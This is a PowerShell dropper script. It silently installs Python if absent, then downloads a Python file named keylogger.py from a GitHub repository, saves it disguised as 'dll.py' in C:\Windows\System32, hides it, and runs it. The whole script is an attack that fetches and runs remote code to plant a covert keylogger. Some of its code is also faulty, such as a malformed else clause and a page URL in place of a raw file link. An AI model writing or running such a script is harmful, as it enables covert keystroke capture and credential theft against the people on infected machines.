$p = &{python -V} 2>&1

$verion = if($p -is[System.Management.Automation.ErrorRecord]){
	$p.Exception.Message

	Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.9/python-3.9.9.exe" -OutFile "C:\Windows\python-3.9.9.exe"
.\Windows\python-3.9.9.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
}
else{
		
	$bol1 = Test-Path -Path "C:\Windows\System32\dll.py"
    if (-Not $bol1){
        Invoke-Webrequest -Uri "https://github.com/ASL-rgb/keylogger/blob/main/keylogger.py" -OutFile "C:\Windows\System32\dll.py"
        $Hide = Get-Item -Force -Path "C:\Windows\System32\dll.py"
        $Hide.Attributes = "hidden"
        python "C:\Windows\System32\dll.py"
        }
    else ($bol1){
      	python "C:\Windows\System32\dll.py"
    
    }
}

